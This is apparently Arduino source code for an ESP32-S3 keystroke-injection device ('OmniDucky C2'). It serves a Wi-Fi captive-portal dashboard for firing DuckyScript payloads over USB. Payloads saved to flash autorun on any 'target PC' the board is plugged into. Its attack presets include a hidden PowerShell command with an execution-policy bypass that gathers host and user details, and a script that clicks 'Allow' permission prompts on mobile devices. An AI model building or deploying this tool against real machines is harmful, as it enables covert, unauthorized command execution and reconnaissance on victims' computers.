/*
 * ============================================================================
 *  🦆 OmniDucky C2 — Standalone Wireless Payload OS for ESP32-S3
 * ============================================================================
 *  Flash ONCE, Control FOREVER from any Phone, Tablet, or PC.
 *  Zero Arduino IDE needed after initial flash. Zero computer required in field.
 *
 *  HOW IT WORKS:
 *  1. Plug ESP32-S3 into any USB port, charger, or target PC.
 *  2. ESP32-S3 broadcasts its own Wi-Fi Access Point: "OmniDucky-C2"
 *  3. Connect from your Phone (Password: "ducky123" or open).
 *  4. Open browser to http://192.168.4.1 (or captive portal opens automatically).
 *  5. Edit, upload, or choose any payload. Click [FIRE] to inject live!
 *  6. Click [SAVE AUTORUN] to save payload to internal flash — it will
 *     automatically execute on target machines the moment it is plugged in!
 *
 *  HARDWARE REQUIREMENTS:
 *  - ESP32-S3 Dev Board with native USB (USB-OTG)
 *  - Arduino IDE Tools Settings:
 *      * Board: ESP32S3 Dev Module
 *      * USB Mode: "USB-OTG (TinyUSB)"
 *      * USB CDC On Boot: "Disabled"
 *      * Upload Mode: "UART0 / Hardware CDC"
 * ============================================================================
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "USBHIDMouse.h"

// ---- WI-FI ACCESS POINT CONFIGURATION ----
const char* AP_SSID = "OmniDucky-C2";
const char* AP_PASS = "ducky123";  // At least 8 chars, or set to "" for open network
const byte DNS_PORT = 53;

IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);
Preferences preferences;

// ---- HARDWARE OBJECTS ----
USBHIDKeyboard usbKeyboard;
USBHIDMouse usbMouse;

#ifndef LED_BUILTIN
#define LED_BUILTIN 2
#endif

#define BOOT_BUTTON_PIN 0

// ---- STATE ----
bool isInjecting = false;
bool autorunEnabled = true;
int calibratedWidth = 1080;
int calibratedHeight = 2400;
String currentScript = "";

// Forward declarations
void executeDuckyScript(const String& script);
void handleRoot();
void handleRun();
void handleSave();
void handleStatus();
void handleNotFound();

// ============================================================================
//  EMBEDDED WEB DASHBOARD (HTML / CSS / JS in Flash)
// ============================================================================
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>OmniDucky C2 | Hardware Controller</title>
  <style>
    :root {
      --bg: #090d16;
      --card: #111827;
      --border: rgba(255,255,255,0.1);
      --accent: #38bdf8;
      --green: #10b981;
      --red: #ef4444;
      --text: #f3f4f6;
      --muted: #9ca3af;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, system-ui, sans-serif; }
    body { background: var(--bg); color: var(--text); padding: 14px; min-height: 100vh; }
    .container { max-width: 680px; margin: 0 auto; display: flex; flex-direction: column; gap: 14px; }
    
    header {
      display: flex; justify-content: space-between; align-items: center;
      padding: 12px 16px; background: var(--card); border: 1px solid var(--border); border-radius: 14px;
    }
    .brand { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 8px; }
    .status-badge {
      font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
      background: rgba(16, 185, 129, 0.15); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3);
    }
    .status-badge.busy { background: rgba(239, 68, 68, 0.15); color: var(--red); border-color: rgba(239, 68, 68, 0.3); }

    .card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 16px; }
    .card-title { font-size: 14px; font-weight: 700; margin-bottom: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }

    .presets { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 6px; }
    .preset-btn {
      background: rgba(255,255,255,0.06); border: 1px solid var(--border); color: var(--text);
      padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: 600; white-space: nowrap; cursor: pointer;
    }
    .preset-btn:active { background: var(--accent); color: #000; }

    textarea {
      width: 100%; height: 260px; background: #030712; border: 1px solid var(--border);
      border-radius: 10px; color: #38bdf8; font-family: monospace; font-size: 13px;
      padding: 12px; line-height: 1.5; resize: vertical; outline: none; margin-top: 8px;
    }
    textarea:focus { border-color: var(--accent); }

    .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
    .btn {
      padding: 12px; border-radius: 10px; font-size: 14px; font-weight: 700; border: none; cursor: pointer;
      display: flex; align-items: center; justify-content: center; gap: 6px;
    }
    .btn-fire { background: var(--accent); color: #082f49; grid-column: span 2; font-size: 15px; }
    .btn-fire:active { background: #7dd3fc; }
    .btn-save { background: rgba(255,255,255,0.08); color: #fff; border: 1px solid var(--border); }
    .btn-clear { background: rgba(239, 68, 68, 0.1); color: var(--red); border: 1px solid rgba(239, 68, 68, 0.3); }

    .toast {
      position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
      background: var(--green); color: #fff; padding: 8px 18px; border-radius: 8px;
      font-size: 13px; font-weight: 600; opacity: 0; pointer-events: none; transition: opacity 0.3s;
    }
    .toast.show { opacity: 1; }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="brand">
        <span>🦆 OmniDucky C2</span>
      </div>
      <div id="status" class="status-badge">ONLINE &bull; ARMED</div>
    </header>

    <div class="card">
      <div class="card-title">Quick Attack Presets</div>
      <div class="presets">
        <button class="preset-btn" onclick="loadPreset('notepad')">Notepad (PC)</button>
        <button class="preset-btn" onclick="loadPreset('rickroll')">Rickroll URL</button>
        <button class="preset-btn" onclick="loadPreset('sysinfo')">Grab SysInfo</button>
        <button class="preset-btn" onclick="loadPreset('mobile_allow')">Mobile Click Allow</button>
        <button class="preset-btn" onclick="loadPreset('jiggler')">Mouse Jiggler</button>
        <button class="preset-btn" onclick="loadPreset('lock')">Lock Screen</button>
      </div>

      <textarea id="script" placeholder="// Enter DuckyScript commands here...
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER"></textarea>

      <button class="btn btn-fire" onclick="firePayload()">🚀 FIRE PAYLOAD NOW</button>
      <div class="btn-row">
        <button class="btn btn-save" onclick="savePayload()">💾 Save as Autorun</button>
        <button class="btn btn-clear" onclick="document.getElementById('script').value = ''">Clear</button>
      </div>
    </div>

    <div class="card" style="font-size: 12px; color: var(--muted); line-height: 1.6;">
      <b>Field Operator Guide:</b><br>
      &bull; <b>Direct Fire</b>: Edits execute live over USB immediately on click.<br>
      &bull; <b>Autorun</b>: Saved script automatically fires when plugged into any target PC.<br>
      &bull; <b>Hardware Button</b>: Press the board's <b>BOOT (GPIO 0)</b> button anytime to re-trigger.
    </div>
  </div>

  <div id="toast" class="toast">Command Sent!</div>

  <script>
    const PRESETS = {
      notepad: "DELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 800\nSTRING Hello from OmniDucky Wireless C2!\nENTER",
      rickroll: "DELAY 1000\nGUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER",
      sysinfo: "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$env:COMPUTERNAME; whoami; ipconfig\" > %TEMP%\\audit.txt\nENTER",
      mobile_allow: "DELAY 1500\nGUI SPACE\nDELAY 800\nSTRING Chrome\nENTER\nDELAY 1500\nTAB\nDELAY 200\nENTER\nMOUSE_POS_PCT 50 62\nDELAY 100\nMOUSE_CLICK LEFT",
      jiggler: "REM Anti-Sleep Mouse Jiggler\nDELAY 1000\nMOUSE_MOVE 40 -40\nDELAY 500\nMOUSE_MOVE -40 40\nDELAY 500\nREPEAT 20",
      lock: "DELAY 500\nGUI l"
    };

    function loadPreset(key) {
      document.getElementById('script').value = PRESETS[key] || '';
      showToast('Loaded ' + key + ' preset');
    }

    async function firePayload() {
      const script = document.getElementById('script').value.trim();
      if (!script) { alert('Payload is empty!'); return; }
      
      setStatus('INJECTING...', true);
      showToast('Firing payload over USB...');
      try {
        const res = await fetch('/api/run', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: script
        });
        if (res.ok) {
          showToast('Payload Finished!');
        } else {
          alert('Execution error: ' + await res.text());
        }
      } catch (e) {
        showToast('Sent (Network busy)');
      }
      setTimeout(() => setStatus('ONLINE • ARMED', false), 1500);
    }

    async function savePayload() {
      const script = document.getElementById('script').value.trim();
      try {
        const res = await fetch('/api/save', {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain' },
          body: script
        });
        showToast('Saved to flash as Autorun!');
      } catch (e) {
        alert('Save error: ' + e);
      }
    }

    async function loadSaved() {
      try {
        const res = await fetch('/api/load');
        const text = await res.text();
        if (text && text.trim().length > 0) {
          document.getElementById('script').value = text;
        } else {
          loadPreset('notepad');
        }
      } catch (e) {
        loadPreset('notepad');
      }
    }

    function setStatus(text, busy) {
      const s = document.getElementById('status');
      s.textContent = text;
      s.className = 'status-badge' + (busy ? ' busy' : '');
    }

    function showToast(msg) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 2000);
    }

    window.onload = loadSaved;
  </script>
</body>
</html>
)rawliteral";

// ============================================================================
//  ARDUINO SETUP & MAIN LOOP
// ============================================================================
void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);

  // 1. Initialize USB HID Keyboard & Mouse
  usbKeyboard.begin();
  usbMouse.begin();
  USB.begin();

  // 2. Load stored Autorun payload from non-volatile flash
  preferences.begin("omniducky", false);
  currentScript = preferences.getString("autorun", "");
  autorunEnabled = preferences.getBool("auto_enabled", true);

  // 3. Configure Wi-Fi SoftAP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID, (strlen(AP_PASS) > 0 ? AP_PASS : NULL));

  Serial.println("[+] OmniDucky C2 Online!");
  Serial.print("[+] Wi-Fi AP: "); Serial.println(AP_SSID);
  Serial.print("[+] Dashboard: http://"); Serial.println(WiFi.softAPIP());

  // 4. Captive Portal DNS Server (redirects all domains to 192.168.4.1)
  dnsServer.start(DNS_PORT, "*", apIP);

  // 5. Web Server Routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/api/run", HTTP_POST, handleRun);
  server.on("/api/save", HTTP_POST, handleSave);
  server.on("/api/load", HTTP_GET, []() {
    server.send(200, "text/plain", currentScript);
  });
  server.on("/api/status", HTTP_GET, handleStatus);
  server.onNotFound(handleNotFound);
  server.begin();

  // 6. Autorun Execution (if plugged into target PC)
  delay(1500); // Give USB time to enumerate on host
  if (autorunEnabled && currentScript.length() > 0) {
    Serial.println("[*] Executing Autorun payload from flash...");
    executeDuckyScript(currentScript);
  }
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // Re-trigger via physical BOOT button (GPIO 0)
  if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
    delay(400); // debounce
    if (currentScript.length() > 0) {
      Serial.println("[*] BOOT button triggered: Executing payload...");
      executeDuckyScript(currentScript);
    }
  }
}

// ============================================================================
//  WEB SERVER HANDLERS
// ============================================================================
void handleRoot() {
  server.send_P(200, "text/html", INDEX_HTML);
}

void handleRun() {
  if (server.hasArg("plain")) {
    String script = server.arg("plain");
    server.send(200, "text/plain", "Executing payload...");
    executeDuckyScript(script);
  } else {
    server.send(400, "text/plain", "Missing script payload");
  }
}

void handleSave() {
  if (server.hasArg("plain")) {
    currentScript = server.arg("plain");
    preferences.putString("autorun", currentScript);
    server.send(200, "text/plain", "Saved as Autorun");
  } else {
    server.send(400, "text/plain", "Missing script payload");
  }
}

void handleStatus() {
  String json = "{\"status\":\"online\",\"injecting\":" + String(isInjecting ? "true" : "false") + "}";
  server.send(200, "application/json", json);
}

void handleNotFound() {
  // Captive Portal Redirect
  server.sendHeader("Location", "http://192.168.4.1/", true);
  server.send(302, "text/plain", "");
}

// ============================================================================
//  ON-CHIP DUCKY SCRIPT INTERPRETER
// ============================================================================
void moveToScreenPercent(float pctX, float pctY, int screenW, int screenH) {
  // Corner-reset: slam to (0,0)
  for (int i = 0; i < 25; i++) {
    usbMouse.move(-120, -120);
    delay(5);
  }
  delay(80);

  int targetX = (int)((pctX / 100.0f) * screenW);
  int targetY = (int)((pctY / 100.0f) * screenH);

  while (targetX > 0 || targetY > 0) {
    int stepX = (targetX > 100) ? 100 : targetX;
    int stepY = (targetY > 100) ? 100 : targetY;
    usbMouse.move(stepX, stepY);
    targetX -= stepX;
    targetY -= stepY;
    delay(5);
  }
  delay(50);
}

void pressModifier(const String& mod) {
  if (mod == "GUI" || mod == "WIN" || mod == "WINDOWS" || mod == "COMMAND") usbKeyboard.press(KEY_LEFT_GUI);
  else if (mod == "CTRL" || mod == "CONTROL") usbKeyboard.press(KEY_LEFT_CTRL);
  else if (mod == "ALT") usbKeyboard.press(KEY_LEFT_ALT);
  else if (mod == "SHIFT") usbKeyboard.press(KEY_LEFT_SHIFT);
}

void pressKey(const String& key) {
  if (key == "ENTER" || key == "RETURN") usbKeyboard.press(KEY_RETURN);
  else if (key == "ESCAPE" || key == "ESC") usbKeyboard.press(KEY_ESC);
  else if (key == "BACKSPACE") usbKeyboard.press(KEY_BACKSPACE);
  else if (key == "TAB") usbKeyboard.press(KEY_TAB);
  else if (key == "SPACE") usbKeyboard.press(' ');
  else if (key == "CAPSLOCK") usbKeyboard.press(KEY_CAPS_LOCK);
  else if (key == "DELETE" || key == "DEL") usbKeyboard.press(KEY_DELETE);
  else if (key == "PRINTSCREEN") usbKeyboard.press(KEY_PRINT_SCREEN);
  else if (key == "UPARROW" || key == "UP") usbKeyboard.press(KEY_UP_ARROW);
  else if (key == "DOWNARROW" || key == "DOWN") usbKeyboard.press(KEY_DOWN_ARROW);
  else if (key == "LEFTARROW" || key == "LEFT") usbKeyboard.press(KEY_LEFT_ARROW);
  else if (key == "RIGHTARROW" || key == "RIGHT") usbKeyboard.press(KEY_RIGHT_ARROW);
  else if (key.length() == 1) usbKeyboard.press(key[0]);
}

void executeDuckyScript(const String& script) {
  isInjecting = true;
  digitalWrite(LED_BUILTIN, HIGH);

  int defaultDelay = 0;
  String prevLine = "";
  int startIdx = 0;

  while (startIdx < script.length()) {
    int endIdx = script.indexOf('\n', startIdx);
    if (endIdx == -1) endIdx = script.length();

    String line = script.substring(startIdx, endIdx);
    line.trim();
    startIdx = endIdx + 1;

    if (line.length() == 0 || line.startsWith("REM")) continue;

    if (defaultDelay > 0) delay(defaultDelay);

    // DELAY <ms>
    if (line.startsWith("DELAY ")) {
      int ms = line.substring(6).toInt();
      delay(ms);
    }
    // DEFAULT_DELAY <ms>
    else if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
      defaultDelay = line.substring(line.indexOf(' ') + 1).toInt();
    }
    // STRING <text>
    else if (line.startsWith("STRING ")) {
      String text = line.substring(7);
      for (int i = 0; i < text.length(); i++) {
        usbKeyboard.press(text[i]);
        delay(6);
        usbKeyboard.release(text[i]);
        delay(6);
      }
    }
    // STRINGLN <text>
    else if (line.startsWith("STRINGLN ")) {
      String text = line.substring(9);
      for (int i = 0; i < text.length(); i++) {
        usbKeyboard.press(text[i]);
        delay(6);
        usbKeyboard.release(text[i]);
        delay(6);
      }
      usbKeyboard.press(KEY_RETURN);
      delay(20);
      usbKeyboard.release(KEY_RETURN);
    }
    // SCREEN_SIZE <w> <h>
    else if (line.startsWith("SCREEN_SIZE ")) {
      String args = line.substring(12);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        calibratedWidth = args.substring(0, sp).toInt();
        calibratedHeight = args.substring(sp + 1).toInt();
      }
    }
    // MOUSE_POS_PCT <pctX> <pctY>
    else if (line.startsWith("MOUSE_POS_PCT ")) {
      String args = line.substring(14);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        float px = args.substring(0, sp).toFloat();
        float py = args.substring(sp + 1).toFloat();
        moveToScreenPercent(px, py, calibratedWidth, calibratedHeight);
      }
    }
    // MOUSE_MOVE <dx> <dy>
    else if (line.startsWith("MOUSE_MOVE ")) {
      String args = line.substring(11);
      int sp = args.indexOf(' ');
      if (sp > 0) {
        int dx = args.substring(0, sp).toInt();
        int dy = args.substring(sp + 1).toInt();
        usbMouse.move(dx, dy);
      }
    }
    // MOUSE_CLICK [LEFT|RIGHT|MIDDLE]
    else if (line.startsWith("MOUSE_CLICK")) {
      uint8_t btn = MOUSE_LEFT;
      if (line.indexOf("RIGHT") > 0) btn = MOUSE_RIGHT;
      else if (line.indexOf("MIDDLE") > 0) btn = MOUSE_MIDDLE;
      usbMouse.click(btn);
      delay(40);
    }
    // MOUSE_SCROLL <val>
    else if (line.startsWith("MOUSE_SCROLL ")) {
      int s = line.substring(13).toInt();
      usbMouse.move(0, 0, s);
    }
    // KEY COMBINATIONS & SPECIAL KEYS (e.g. GUI r, CTRL ALT DELETE, ENTER)
    else {
      String upper = line;
      upper.toUpperCase();

      // Tokenize by space
      int p = 0;
      bool hasTokens = false;
      while (p < upper.length()) {
        int nextSpace = upper.indexOf(' ', p);
        if (nextSpace == -1) nextSpace = upper.length();
        String token = upper.substring(p, nextSpace);
        token.trim();
        p = nextSpace + 1;

        if (token.length() == 0) continue;
        hasTokens = true;

        if (token == "GUI" || token == "WIN" || token == "WINDOWS" || token == "CTRL" ||
            token == "ALT" || token == "SHIFT" || token == "COMMAND") {
          pressModifier(token);
        } else {
          pressKey(token);
        }
      }
      delay(30);
      usbKeyboard.releaseAll();
    }
  }

  digitalWrite(LED_BUILTIN, LOW);
  isInjecting = false;
}
